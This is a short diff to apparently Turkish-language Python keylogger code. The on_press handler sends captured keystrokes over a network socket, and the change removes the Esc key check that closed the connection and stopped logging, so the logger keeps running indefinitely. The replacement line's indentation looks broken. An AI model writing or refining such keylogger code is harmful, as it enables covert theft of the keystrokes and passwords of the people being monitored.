@@ -28,9 +28,7 @@ def on_press(key):
     istemci.sendall(veri.encode())
 
 def on_release(key):
-    if key == Key.esc:
-        istemci.close()
-        return False
+        return True
 
 if __name__ == '__main__':
     script_path = os.path.abspath(__file__)
